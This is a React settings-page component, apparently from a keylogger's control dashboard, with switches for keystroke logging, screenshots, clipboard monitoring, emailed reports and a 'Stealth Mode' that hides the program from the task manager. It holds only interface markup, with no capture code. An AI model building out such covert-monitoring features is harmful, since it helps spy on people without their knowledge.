import { Card } from './ui/card';
import { Switch } from './ui/switch';
import { Label } from './ui/label';
import { Input } from './ui/input';
import { Button } from './ui/button';
import { Settings, Bell, Shield, Database, Trash2 } from 'lucide-react';

export function SettingsView() {
  return (
    <div className="p-6 space-y-6 bg-gray-50">
      <div>
        <h2 className="text-2xl mb-1">Settings</h2>
        <p className="text-sm text-gray-500">Configure keylogger behavior and preferences</p>
      </div>

      <div className="grid grid-cols-2 gap-6">
        {/* General Settings */}
        <Card className="bg-white border-gray-200">
          <div className="p-4 border-b border-gray-200">
            <h3 className="flex items-center gap-2">
              <Settings size={18} />
              General Settings
            </h3>
          </div>
          <div className="p-4 space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <Label>Enable Keylogging</Label>
                <p className="text-xs text-gray-500">Capture keyboard inputs</p>
              </div>
              <Switch defaultChecked />
            </div>
            
            <div className="flex items-center justify-between">
              <div>
                <Label>Screenshot Capture</Label>
                <p className="text-xs text-gray-500">Take periodic screenshots</p>
              </div>
              <Switch defaultChecked />
            </div>
            
            <div className="flex items-center justify-between">
              <div>
                <Label>Clipboard Monitoring</Label>
                <p className="text-xs text-gray-500">Track clipboard changes</p>
              </div>
              <Switch />
            </div>

            <div>
              <Label className="mb-2 block">Screenshot Interval (seconds)</Label>
              <Input type="number" defaultValue="30" className="bg-white border-gray-300" />
            </div>
          </div>
        </Card>

        {/* Notifications */}
        <Card className="bg-white border-gray-200">
          <div className="p-4 border-b border-gray-200">
            <h3 className="flex items-center gap-2">
              <Bell size={18} />
              Notifications
            </h3>
          </div>
          <div className="p-4 space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <Label>Security Alerts</Label>
                <p className="text-xs text-gray-500">Notify on security events</p>
              </div>
              <Switch defaultChecked />
            </div>
            
            <div className="flex items-center justify-between">
              <div>
                <Label>Daily Reports</Label>
                <p className="text-xs text-gray-500">Email daily activity summary</p>
              </div>
              <Switch defaultChecked />
            </div>
            
            <div className="flex items-center justify-between">
              <div>
                <Label>System Warnings</Label>
                <p className="text-xs text-gray-500">Alert on system issues</p>
              </div>
              <Switch defaultChecked />
            </div>

            <div>
              <Label className="mb-2 block">Email Address</Label>
              <Input type="email" placeholder="admin@company.com" className="bg-white border-gray-300" />
            </div>
          </div>
        </Card>

        {/* Security */}
        <Card className="bg-white border-gray-200">
          <div className="p-4 border-b border-gray-200">
            <h3 className="flex items-center gap-2">
              <Shield size={18} />
              Security
            </h3>
          </div>
          <div className="p-4 space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <Label>Encrypt Logs</Label>
                <p className="text-xs text-gray-500">Use AES-256 encryption</p>
              </div>
              <Switch defaultChecked />
            </div>
            
            <div className="flex items-center justify-between">
              <div>
                <Label>Stealth Mode</Label>
                <p className="text-xs text-gray-500">Hide from task manager</p>
              </div>
              <Switch defaultChecked />
            </div>

            <div>
              <Label className="mb-2 block">Master Password</Label>
              <Input type="password" placeholder="••••••••" className="bg-white border-gray-300" />
            </div>

            <Button className="w-full" variant="outline">
              Change Password
            </Button>
          </div>
        </Card>

        {/* Data Management */}
        <Card className="bg-white border-gray-200">
          <div className="p-4 border-b border-gray-200">
            <h3 className="flex items-center gap-2">
              <Database size={18} />
              Data Management
            </h3>
          </div>
          <div className="p-4 space-y-4">
            <div>
              <Label className="mb-2 block">Data Retention (days)</Label>
              <Input type="number" defaultValue="30" className="bg-white border-gray-300" />
            </div>

            <div className="p-3 bg-gray-50 border border-gray-200 rounded-lg">
              <div className="space-y-1 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-500">Database Size</span>
                  <span>245 MB</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-500">Total Logs</span>
                  <span>12,847</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-500">Screenshots</span>
                  <span>342 files</span>
                </div>
              </div>
            </div>

            <Button className="w-full bg-red-600 hover:bg-red-700">
              <Trash2 size={16} className="mr-2" />
              Clear All Data
            </Button>
          </div>
        </Card>
      </div>
    </div>
  );
}